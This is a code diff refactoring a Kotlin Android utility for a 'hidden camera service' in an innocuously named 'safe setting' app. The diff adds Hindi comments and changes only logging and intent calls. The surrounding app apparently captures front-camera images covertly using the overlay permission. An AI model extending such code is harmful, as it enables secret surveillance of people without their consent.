@@ -18,8 +18,8 @@ import com.safe.setting.app.utils.Consts.TAG
 import com.safe.setting.app.utils.FileHelper.getFilePath
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraImageFormat
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
-import com.pawegio.kandroid.e
-import com.pawegio.kandroid.start
+// import com.pawegio.kandroid.e // **** पुराना इम्पोर्ट हटा दिया गया ****
+// import com.pawegio.kandroid.start // **** पुराना इम्पोर्ट हटा दिया गया ****
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
@@ -27,37 +27,33 @@ import java.io.IOException
 
 object HiddenCameraUtils {
 
-
     fun Context.canOverDrawOtherApps(): Boolean {
         return Settings.canDrawOverlays(this)
     }
 
     fun Context.openDrawOverPermissionSetting() {
         val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, "package:$packageName".toUri())
-        intent.start(this)
+        // **** बदला हुआ कोड: intent.start(this) को context.startActivity(intent) से बदलें ****
+        this.startActivity(intent)
+        // **** बदलाव समाप्त ****
     }
 
     fun Context.isFrontCameraAvailable(): Boolean {
         val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
         try {
-            // Get all available camera IDs
             val cameraIds = cameraManager.cameraIdList
-            // Iterate through each camera ID
             for (cameraId in cameraIds) {
-                // Get camera characteristics
                 val characteristics = cameraManager.getCameraCharacteristics(cameraId)
-                // Check if facing direction is front
                 val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                 if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                    return true // Front camera found
+                    return true
                 }
             }
         } catch (e: CameraAccessException) {
             Log.e("CameraAccess", "Error checking camera availability: $e")
         }
-        return false // No front camera found
+        return false
     }
-
 
     @Throws(Exception::class)
     fun Context.getFileName() : String {
@@ -83,7 +79,7 @@ object HiddenCameraUtils {
     }
 
     internal fun Bitmap.saveImageFromFile(fileToSave: File,
-                                   @CameraImageFormat.SupportedImageFormat imageFormat: Int): Boolean {
+                                          @CameraImageFormat.SupportedImageFormat imageFormat: Int): Boolean {
         var out: FileOutputStream? = null
         var isSuccess:Boolean
 
@@ -96,15 +92,18 @@ object HiddenCameraUtils {
             compress(compressFormat, 100, out)
             isSuccess = true
         } catch (e: Exception) {
-            e(TAG,e.message.toString())
+            // **** बदला हुआ कोड: kandroid.e को Log.e से बदलें ****
+            Log.e(TAG,e.message.toString())
+            // **** बदलाव समाप्त ****
             isSuccess = false
         } finally {
             try {
                 out?.close()
             } catch (e: IOException) {
-                e(TAG,e.message.toString())
+                // **** बदला हुआ कोड: kandroid.e को Log.e से बदलें ****
+                Log.e(TAG,e.message.toString())
+                // **** बदलाव समाप्त ****
             }
-
         }
         return isSuccess
     }
